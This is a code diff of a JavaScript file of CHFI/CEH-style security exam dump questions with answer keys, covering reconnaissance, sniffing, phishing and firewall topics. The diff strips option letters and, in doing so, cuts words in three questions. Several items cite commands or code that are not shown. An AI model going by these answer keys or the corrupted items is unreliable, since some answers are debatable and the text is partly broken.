+      'allinurl:"exchange/logon.asp"',
+      'intitle:"exchange server"',
+      'locate:"logon page"',
+      'outlook:"search"',
     ],
     correctAnswer: 0,
   },
@@ -8628,10 +8590,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "When setting up a wireless network with multiple access points, why is it important to set each access point on a different channel?",
     options: [
-      "A. Multiple access points can be set up on the same channel without any issues",
-      "B. Avoid over-saturation of wireless signals",
-      "C. So that the access points will work on different frequencies",
-      "D. Avoid cross talk",
+      "Multiple access points can be set up on the same channel without any issues",
+      "Avoid over-saturation of wireless signals",
+      "So that the access points will work on different frequencies",
+      "Avoid cross talk",
     ],
     correctAnswer: 3,
   },
@@ -8640,10 +8602,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "After normal working hours, you initiate a DoS attack against your external firewall and then initiate an FTP connection from an external IP. The FTP connection is successful even though FTP is blocked at the external firewall. What has happened?",
     options: [
-      "A. The firewall failed-bypass",
-      "B. The firewall failed-closed",
-      "C. The firewall ACL has been purged",
-      "D. The firewall failed-open",
+      "The firewall failed-bypass",
+      "The firewall failed-closed",
+      "The firewall ACL has been purged",
+      "The firewall failed-open",
     ],
     correctAnswer: 3,
   },
@@ -8652,10 +8614,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "How would you answer if asked about the methodology you will be using to test the company's network after passing your ECSA exam?",
     options: [
-      "A. Microsoft Methodology",
-      "B. Google Methodology",
-      "C. IBM Methodology",
-      "D. LPT Methodology",
+      "Microsoft Methodology",
+      "Google Methodology",
+      "IBM Methodology",
+      "LPT Methodology",
     ],
     correctAnswer: 3,
   },
@@ -8664,10 +8626,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "After passing her CEH exam, Carol wants to ensure that her network is completely secure. She implements a DMZ, statefull firewall, NAT, IPSEC, and a packet filtering firewall. Since all security measures were taken, none of the hosts on her network can reach the Internet. Why is that?",
     options: [
-      "A. Statefull firewalls do not work with packet filtering firewalls",
-      "B. NAT does not work with statefull firewalls",
-      "C. IPSEC does not work with packet filtering firewalls",
-      "D. NAT does not work with IPSEC",
+      "Statefull firewalls do not work with packet filtering firewalls",
+      "NAT does not work with statefull firewalls",
+      "IPSEC does not work with packet filtering firewalls",
+      "NAT does not work with IPSEC",
     ],
     correctAnswer: 3,
   },
@@ -8676,10 +8638,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Jason has set up a honeypot environment by creating a DMZ that has no physical or logical access to his production network. In this honeypot, he has placed a server running Windows Active Directory. He has also placed a Web server in the DMZ that services a number of web pages that offer visitors a chance to download sensitive information by clicking on a button. A week later, Jason finds in his network logs how an intruder accessed the honeypot and downloaded sensitive information. Why will this not be viable to prosecute the intruder?",
     options: [
-      "A. Entrapment",
-      "B. Enticement",
-      "C. Intruding into a honeypot is not illegal",
-      "D. Intruding into a DMZ is not illegal",
+      "Entrapment",
+      "Enticement",
+      "Intruding into a honeypot is not illegal",
+      "Intruding into a DMZ is not illegal",
     ],
     correctAnswer: 0,
   },
@@ -8688,10 +8650,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "You have compromised a lower-level administrator account on an Active Directory network of a small company. You discover Domain Controllers through enumeration. You connect to one of the Domain Controllers on port 389 using ldp.exe. What are you trying to accomplish here?",
     options: [
-      "A. Poison the DNS records with false records",
-      "B. Enumerate MX and A records from DNS",
-      "C. Establish a remote connection to the Domain Controller",
-      "D. Enumerate domain user accounts and built-in groups",
+      "Poison the DNS records with false records",
+      "Enumerate MX and A records from DNS",
+      "Establish a remote connection to the Domain Controller",
+      "Enumerate domain user accounts and built-in groups",
     ],
     correctAnswer: 3,
   },
@@ -8700,10 +8662,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What are the security risks of running a 'repair' installation for Windows XP?",
     options: [
-      "A. Pressing Shift+F10 gives the user administrative rights",
-      "B. Pressing Shift+F1 gives the user administrative rights",
-      "C. Pressing Ctrl+F10 gives the user administrative rights",
-      "D. There are no security risks when running the 'repair' installation for Windows XP",
+      "Pressing Shift+F10 gives the user administrative rights",
+      "Pressing Shift+F1 gives the user administrative rights",
+      "Pressing Ctrl+F10 gives the user administrative rights",
+      "There are no security risks when running the 'repair' installation for Windows XP",
     ],
     correctAnswer: 0,
   },
@@ -8712,22 +8674,22 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Terri works for a security consulting firm that is currently performing a penetration test on First National Bank in Tokyo. Terri's duties include bypassing firewalls and switches to gain access to the network. Terri sends an IP packet to one of the company's switches with ACK bit and the source address of her machine set. What is Terri trying to accomplish by sending this IP packet?",
     options: [
-      "A. Trick the switch into thinking it already has a session with Terri's computer",
-      "B. Poison the switch's MAC address table by flooding it with ACK bits",
-      "C. Crash the switch with a DoS attack since switches cannot send ACK bits",
-      "D. Enable tunneling feature on the switch",
+      "Trick the switch into thinking it already has a session with Terri's computer",
+      "Poison the switch's MAC address table by flooding it with ACK bits",
+      "Crash the switch with a DoS attack since switches cannot send ACK bits",
+      "Enable tunneling feature on the switch",
     ],
     correctAnswer: 0,
   },
   {
     id: 960,
     question:
-      "You are a security analyst performing reconnaissance on a company you will be carrying out a penetration test for. You conduct a search for IT jobs on Dice.com and find the following information for an open position: 7+ years experience in Windows Server environment, 5+ years experience in Exchange 2000/2003 environment, Experience with Cisco Pix Firewall, Linksys 1376 router, Oracle 11i, and MYOB v3.4 Accounting software are required. MCSA desired, MCSE, CEH preferred. What is this information posted on the job website considered?",
+      "You are a security analyst performing reconnaissance on a company you will be carrying out a penetration test for. You conduct a search for IT jobs on Dice.com and find the following information for an open position: 7+ years experience in Windows Server environment, 5+ years experience in Exchange 2000/2003 environment, Experience with Cisco Pix Firewall, Linksys 1376 router, Oracle 11i, and MYOB v3.4 Accounting software are requireMCSA desired, MCSE, CEH preferreWhat is this information posted on the job website considered?",
     options: [
-      "A. Social engineering exploit",
-      "B. Competitive exploit",
-      "C. Information vulnerability",
-      "D. Trade secret",
+      "Social engineering exploit",
+      "Competitive exploit",
+      "Information vulnerability",
+      "Trade secret",
     ],
     correctAnswer: 2,
   },
@@ -8736,10 +8698,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "The objective of this act was to protect consumers' personal financial information held by financial institutions and their service providers.",
     options: [
-      "A. Gramm-Leach-Bliley Act",
-      "B. Sarbanes-Oxley 2002",
-      "C. California SB 1386",
-      "D. HIPAA",
+      "Gramm-Leach-Bliley Act",
+      "Sarbanes-Oxley 2002",
+      "California SB 1386",
+      "HIPAA",
     ],
     correctAnswer: 0,
   },
@@ -8748,10 +8710,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Why is it a good idea to perform a penetration test from the inside?",
     options: [
-      "A. It is never a good idea to perform a penetration test from the inside",
-      "B. Because 70% of attacks are from inside the organization",
-      "C. To attack a network from a hacker's perspective",
-      "D. It is easier to hack from the inside",
+      "It is never a good idea to perform a penetration test from the inside",
+      "Because 70% of attacks are from inside the organization",
+      "To attack a network from a hacker's perspective",
+      "It is easier to hack from the inside",
     ],
     correctAnswer: 1,
   },
@@ -8760,10 +8722,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Harold is a web designer who has completed a website for ghttech.net. As part of the maintenance agreement he signed with the client, Harold is performing research online and seeing how much exposure the site has received so far. Harold navigates to google.com and types in the following search. link:www.ghttech.net What will this search produce?",
     options: [
-      "A. All sites that ghttech.net links to",
-      "B. All sites that link to ghttech.net",
-      "C. All search engines that link to .net domains",
-      "D. Sites that contain the code: link:www.ghttech.net",
+      "All sites that ghttech.net links to",
+      "All sites that link to ghttech.net",
+      "All search engines that link to .net domains",
+      "Sites that contain the code: link:www.ghttech.net",
     ],
     correctAnswer: 1,
   },
@@ -8772,10 +8734,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "A packet is sent to a router that does not have the packet destination address in its route table, how will the packet get to its proper destination address?",
     options: [
-      "A. Root Internet servers",
-      "B. Border Gateway Protocol",
-      "C. Gateway of last resort",
-      "D. Reverse DNS",
+      "Root Internet servers",
+      "Border Gateway Protocol",
+      "Gateway of last resort",
+      "Reverse DNS",
     ],
     correctAnswer: 2,
   },
@@ -8783,18 +8745,18 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 966,
     question:
       "James is testing the ability of his routers to withstand DoS attacks. James sends ICMP ECHO requests to the broadcast address of his network. What type of DoS attack is James testing against his network?",
-    options: ["A. Smurf", "B. Trinoo", "C. Fraggle", "D. SYN flood"],
+    options: ["Smurf", "Trinoo", "Fraggle", "SYN flood"],
     correctAnswer: 0,
   },
   {
     id: 967,
     question:
-      "Kyle is performing the final testing of an application he developed for the accounting department. His last round of testing is to ensure that the program is as secure as possible. Kyle runs the following command. What is he testing at this point?",
+      "Kyle is performing the final testing of an application he developed for the accounting department. His last round of testing is to ensure that the program is as secure as possible. Kyle runs the following commanWhat is he testing at this point?",
     options: [
-      "A. Buffer overflow",
-      "B. SQL injection",
-      "C. Format string bug",
-      "D. Kernel injection",
+      "Buffer overflow",
+      "SQL injection",
+      "Format string bug",
+      "Kernel injection",
     ],
     correctAnswer: 0,
   },
@@ -8802,12 +8764,7 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 968,
     question:
       "You are running known exploits against your network to test for possible vulnerabilities. To test the strength of your virus software, you load a test network to mimic your production network. Your software successfully blocks some simple macro and encrypted viruses. You decide to really test the software by using virus code where the code rewrites itself entirely and the signatures change from child to child, but the functionality stays the same. What type of virus is this that you are testing?",
-    options: [
-      "A. Polymorphic",
-      "B. Metamorphic",
-      "C. Oligomorphic",
-      "D. Transmorphic",
-    ],
+    options: ["Polymorphic", "Metamorphic", "Oligomorphic", "Transmorphic"],
     correctAnswer: 1,
   },
   {
@@ -8815,10 +8772,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What is a good security method to prevent unauthorized users from 'tailgating'?",
     options: [
-      "A. Man trap",
-      "B. Electronic combination locks",
-      "C. Pick-resistant locks",
-      "D. Electronic key systems",
+      "Man trap",
+      "Electronic combination locks",
+      "Pick-resistant locks",
+      "Electronic key systems",
     ],
     correctAnswer: 0,
   },
@@ -8826,18 +8783,18 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 970,
     question:
       "You are the security analyst working for a private company out of France. Your current assignment is to obtain credit card information from a Swiss bank owned by that company. After initial reconnaissance, you discover that the bank security defenses are very strong and would take too long to penetrate. You decide to get the information by monitoring the traffic between the bank and one of its subsidiaries in London. After monitoring some of the traffic, you see a lot of FTP packets traveling back and forth. You want to sniff the traffic and extract usernames and passwords. What tool could you use to get this information?",
-    options: ["A. Airsnort", "B. Snort", "C. Ettercap", "D. RaidSniff"],
+    options: ["Airsnort", "Snort", "Ettercap", "RaidSniff"],
     correctAnswer: 2,
   },
   {
     id: 971,
     question:
-      "As a security analyst you set up a false survey website that will require users to create a username and a strong password. You send the link to all the employees of the company. What information will you be able to gather?",
+      "As a security analyst you set up a false survey website that will require users to create a username and a strong passworYou send the link to all the employees of the company. What information will you be able to gather?",
     options: [
-      "A. The IP address of the employees' computers",
-      "B. Bank account numbers and the corresponding routing numbers",
-      "C. The employees' network usernames and passwords",
-      "D. The MAC address of the employees' computers",
+      "The IP address of the employees' computers",
+      "Bank account numbers and the corresponding routing numbers",
+      "The employees' network usernames and passwords",
+      "The MAC address of the employees' computers",
     ],
     correctAnswer: 2,
   },
@@ -8846,10 +8803,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Harold wants to set up a firewall on his network but is not sure which one would be the most appropriate. He knows he needs to allow FTP traffic to one of the servers on his network, but he wants to only allow FTP-PUT. Which firewall would be most appropriate for Harold's needs?",
     options: [
-      "A. Circuit-level proxy firewall",
-      "B. Packet filtering firewall",
-      "C. Application-level proxy firewall",
-      "D. Data link layer firewall",
+      "Circuit-level proxy firewall",
+      "Packet filtering firewall",
+      "Application-level proxy firewall",
+      "Data link layer firewall",
     ],
     correctAnswer: 2,
   },
@@ -8858,10 +8815,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "What will the following command accomplish? (Test ability of a router to handle over-sized packets)",
     options: [
-      "A. Test ability of a router to handle over-sized packets",
-      "B. Test the ability of a router to handle under-sized packets",
-      "C. Test the ability of a WLAN to handle fragmented packets",
-      "D. Test the ability of a router to handle fragmented packets",
+      "Test ability of a router to handle over-sized packets",
+      "Test the ability of a router to handle under-sized packets",
+      "Test the ability of a WLAN to handle fragmented packets",
+      "Test the ability of a router to handle fragmented packets",
     ],
     correctAnswer: 0,
   },
@@ -8869,10 +8826,10 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 975,
     question: "What does ICMP Type 3/Code 13 mean?",
     options: [
-      "A. Host Unreachable",
-      "B. Administratively Blocked",
-      "C. Port Unreachable",
-      "D. Protocol Unreachable",
+      "Host Unreachable",
+      "Administratively Blocked",
+      "Port Unreachable",
+      "Protocol Unreachable",
     ],
     correctAnswer: 1,
   },
@@ -8881,10 +8838,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Your company's network just finished going through a SAS 70 audit. This audit reported that overall, your network is secure, but there are some areas that need improvement. The major area was SNMP security. The audit company recommended turning off SNMP, but that is not an option since you have so many remote nodes to keep track of. What step could you take to help secure SNMP on your network?",
     options: [
-      "A. Block all internal MAC address from using SNMP",
-      "B. Block access to UDP port 171",
-      "C. Block access to TCP port 171",
-      "D. Change the default community string names",
+      "Block all internal MAC address from using SNMP",
+      "Block access to UDP port 171",
+      "Block access to TCP port 171",
+      "Change the default community string names",
     ],
     correctAnswer: 3,
   },
@@ -8893,10 +8850,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "After attending a CEH security seminar, you make a list of changes you would like to perform on your network to increase its security. One of the first things you change is to switch the RestrictAnonymous setting from 0 to 1 on your servers. This, as you were told, would prevent anonymous users from establishing a null session on the server. Using Userinfo tool mentioned at the seminar, you succeed in establishing a null session with one of the servers. Why is that?",
     options: [
-      "A. RestrictAnonymous must be set to '10' for complete security",
-      "B. RestrictAnonymous must be set to '3' for complete security",
-      "C. RestrictAnonymous must be set to '2' for complete security",
-      "D. There is no way to always prevent an anonymous null session from establishing",
+      "RestrictAnonymous must be set to '10' for complete security",
+      "RestrictAnonymous must be set to '3' for complete security",
+      "RestrictAnonymous must be set to '2' for complete security",
+      "There is no way to always prevent an anonymous null session from establishing",
     ],
     correctAnswer: 2,
   },
@@ -8905,10 +8862,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "In a virtual test environment, Michael is testing the strength and security of BGP using multiple routers to mimic the backbone of the Internet. This project will help him write his doctoral thesis on 'bringing down the Internet'. Without sniffing the traffic between the routers, Michael sends millions of RESET packets to the routers in an attempt to shut one or all of them down. After a few hours, one of the routers finally shuts itself down. What will the other routers communicate between themselves?",
     options: [
-      "A. The change in the routing fabric to bypass the affected router",
-      "B. More RESET packets to the affected router to get it to power back up",
-      "C. RESTART packets to the affected router to get it to power back up",
-      "D. STOP packets to all other routers warning of where the attack originated",
+      "The change in the routing fabric to bypass the affected router",
+      "More RESET packets to the affected router to get it to power back up",
+      "RESTART packets to the affected router to get it to power back up",
+      "STOP packets to all other routers warning of where the attack originated",
     ],
     correctAnswer: 0,
   },
@@ -8916,12 +8873,7 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 981,
     question:
       "How many possible sequence number combinations are there in TCP/IP protocol?",
-    options: [
-      "A. 1 billion",
-      "B. 320 billion",
-      "C. 4 billion",
-      "D. 32 million",
-    ],
+    options: ["1 billion", "320 billion", "4 billion", "32 million"],
     correctAnswer: 2,
   },
   {
@@ -8929,10 +8881,10 @@ export const CHFI_DUMP_QUESTIONS = [
     question:
       "Tyler is setting up a wireless network for his business that he runs out of his home. He has followed all the directions from the ISP as well as the wireless router manual. He does not have any encryption set and the SSID is being broadcast. On his laptop, he can pick up the wireless signal for short periods of time, but then the connection drops and the signal goes away. Eventually the wireless signal shows back up, but drops intermittently. What could be Tyler's issue with his home wireless network?",
     options: [
-      "A. Computers on his wired network",
-      "B. Satellite television",
-      "C. 2.4GHz Cordless phones",
-      "D. CB radio",
+      "Computers on his wired network",
+      "Satellite television",
+      "2.4GHz Cordless phones",
+      "CB radio",
     ],
     correctAnswer: 2,
   },
@@ -8940,12 +8892,7 @@ export const CHFI_DUMP_QUESTIONS = [
     id: 983,
     question:
       "You are working on a thesis for your doctorate degree in Computer Science. Your thesis is based on HTML, DHTML, and other web-based languages and how they have evolved over the years. You navigate to archive.org and view the HTML code of news.com. You then navigate to the current news.com website and copy over the source code. While searching through the code, you come across something abnormal: What have you found?",
-    options: [
-      "A. Web bug",
-      "B. CGI code",
-      "C. Trojan.downloader",
-      "D. Blind bug",
-    ],
+    options: ["Web bug", "CGI code", "Trojan.downloader", "Blind bug"],
     correctAnswer: 0,
   },
   {
@@ -8959,12 +8906,5 @@ export const CHFI_DUMP_QUESTIONS = [
       "Preparation for incident handling and response",
     ],
     correctAnswer: 2,
-  },
-  {
-    id: 985,
-    question:
-      "If you discover a criminal act while investigating a corporate policy abuse, it becomes a publicsector investigation and should be referred to law enforcement?",
-    options: ["true", "false"],
-    correctAnswer: 0,
   },
 ];
